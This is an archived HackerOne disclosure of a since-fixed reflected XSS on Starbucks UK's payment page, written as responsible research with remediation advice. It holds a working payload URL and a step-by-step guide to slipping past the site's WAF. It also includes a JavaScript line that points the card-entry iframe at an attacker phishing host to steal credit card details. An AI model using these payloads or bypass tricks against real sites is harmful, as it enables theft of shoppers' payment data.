---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/cross-site-scripting-xss-generic
  - env/web
substate: "resolved"
weakness: "Cross-site Scripting (XSS) - Generic"
enriched: true
body: true
date: 2018-05-22
submitted: 2017-05-10T13:28:32.386Z
bounty_usd: null
votes: 27
cve: []
program: "[[programs/starbucks|Starbucks]]"
reporter: "bayotop"
source: "https://hackerone.com/reports/227486"
title: "XSS on https://www.starbucks.co.uk (can lead to credit card theft) (/shop/paymentmethod)"
---
# XSS on https://www.starbucks.co.uk (can lead to credit card theft) (/shop/paymentmethod)

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 27 | **Program:** Starbucks | **Disclosed:** 2018-05-22

- Report: [https://hackerone.com/reports/227486](https://hackerone.com/reports/227486)
- CWE: Cross-site Scripting (XSS) - Generic
- Submitted: 2017-05-10T13:28:32.386Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

Hi,

**Steps to reproduce:**

0. Run Firefox (these steps *require* Firefox).
1. Log in on https://www.starbucks.co.uk/account/signin
2. Go to https://www.starbucks.co.uk/shop/card/egift and add any card to your basket.
3. Go to https://www.starbucks.co.uk/shop/paymentmethod?==%u0022a%20onclick=confirm(/-/g+this.ownerDocument.domain)%20id=%u0022checkoutButton
4. After the page finishes loading click the "Checkout" title.
5. A confirmation prompt is shown showing the current domain.

**Note** that these steps can be automated due to missing CSRF protection on the "Add to Basket" option. Effectively, all a user has to do is to load a page which is under attacker's control. I set up an example: http://bayo.rocks/f42e32a3-9e9a-4be0-8cfb-4b5d766b97d0/sbux_poc.html (this link is private).

**Description:**

I'll explain what is going on and why this works. First, take a look at https://www.starbucks.co.uk/shop/card/egift?reflected 
Looking at the source code you see the whole URL is reflected in a link tag. 

```html
<link rel="canonical" href="https://www.starbucks.co.uk/shop/card/egift?reflected" />
```
Trying to inject malicious code seems to be blocked by a WAF. However, all checks can be eventually bypassed to inject arbitrary attributes, e.g. https://www.starbucks.co.uk/shop/card/egift?%u0022%20id=%u0022injected results in: 

```html
<link rel="canonical" href="https://www.starbucks.co.uk/shop/card/egift?" id="injected" />
```

This works on every page (!) site-wide. However, I am not aware of any technique to get arbitrary JS execution at this point. However, there is a handy [script](https://www.starbucks.co.uk/static/resource/shop_js/676938998_en-GB) loaded into the page that does the following:

```javascript
$("#checkout").bind("click", function(e) {
    $("#checkoutButton").trigger("click")
});
```

You see where this is going. In case I find a page that has an element with the id **checkout**, I can inject **id="checkoutButton" onclick="malicous_js"** to the above link element and the injected JS will be executed once the **checkout** element is clicked. 

Exactly such a page is https://www.starbucks.co.uk/shop/paymentmethod (requires authentication). You can see the credit card form being loaded on this page. Luckily, it is loaded from a different origin so the form data can't be read using the injected JS. However, a determined attacker can easily set up a exact-looking page and change the iframe's content to steal the victim's credit card information:

```javascript
document.getElementById('payment-method-iframe').contentWindow.location.href = 'https://sbuxphishingsiteunderattackerscontrol.com';
```

**Note** that the **checkout** element is actually **<body>** so there is plenty of space where the user can click to execute the malicious JS.

Take into consideration that his could work in both IE and Chrome and the only thing preventing the PoC are the browsers' built in XSS protections. I am working on a bypass, but unfortunately I am not quite there, yet.

To sum up, I'll breakdown the injection from the PoC (==%u0022a%20onclick=confirm(/-/g+this.ownerDocument.domain)%20id=%u0022checkoutButton):

1. **==** -> used to trick the [query string parsing code](https://www.starbucks.co.uk/static/resource/shop_js/676938998_en-GB) that is calling decodeURIcomponent(). Otherwise decodeURIcomponent("%u0022") throws an exception resulting in the "checkout bind" never being called.
2. **%u0022** -> bypasses the WAF that is causing a 404 when the query contains "%22".
3. **a%20onclick=** -> allows to inject any on*= handlers. Otherwise a server error is returned when a blacklisted onhandler is followed by an equals sign in the query.
4. **confirm(/-/g** -> the WAF seems to dislike confirm(), alert() and so on. Adding a '/' after the left bracket makes him happy again.
5. **+this.ownerDocument.domain)** -> the WAF doesn't like "document".

**Impact**

As mentioned, an attacker can easily trick users into disclosing their credit data. The victims might not even realize that they were tricked and their privacy was compromised. All they know is they entered their data on "https://starbucks.co.uk" as usual. Note that other "typical" possible ways to compromise the victims using XSS (BeEF hooks etc.) are, of course, still applicable.

**Recommendation**

Correctly encode user input before rendering it back into the page. You shouldn't rely only on your WAF / custom blacklisting to protect you. Consider auditing yout site and adding CSRF protection to actions like "Add to Basket". You might also consider fixing the bypasses I mentioned.

## Timeline

- **Report Filed**
- **Report Title Updated**
- **2017-05-10** @sharpie: Thanks for sending this in! We are currently reviewing this submission and we'll notify you once we have more information to share with you.
- **Report Triaged**
- **2017-06-02** @bayotop: Hi,

Any updates? In the recently disclosed issue https://hackerone.com/reports/177472 you state that you typically try to award bounties at triage, or shortly after. Is this entry different or is the decision delayed for another reason? Thanks.
- **Report Resolved**
- **Bounty Awarded**
- **2017-06-06** @bayotop: Hi @siren, 

I am not able to reproduce anymore as the WAF will redirect requests containing ```%u0022``` (404). I am also happy to see that the "Add to Basket" option is now protected against CSRF.

However, I am not quite able to verify whether the ```"``` character is correctly encoded in the initial injection point. If not, future bypasses might be discovered making this exploitable again.

The bounty is much appreciated. Thanks.
- **2017-06-06** @siren: Thanks for confirming @bayotop!
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
- **Changed Scope**
